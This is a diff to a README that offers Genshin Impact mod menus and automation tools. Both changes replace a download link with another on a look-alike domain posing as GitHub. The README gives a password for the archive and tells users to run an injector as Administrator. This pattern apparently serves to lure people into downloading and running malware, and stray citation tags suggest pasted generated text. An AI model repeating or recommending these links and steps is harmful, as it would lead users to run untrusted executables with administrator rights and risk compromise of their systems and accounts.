@@ -9,7 +9,7 @@ Collection of open‑source tools for **Genshin Impact** — mod menus, UI autom
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -99,7 +99,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 
 2. Choose your tool:
    - **Mod Menu:** Run the injector as Administrator, press `F1` or custom key to open menu[citation:2][citation:8]
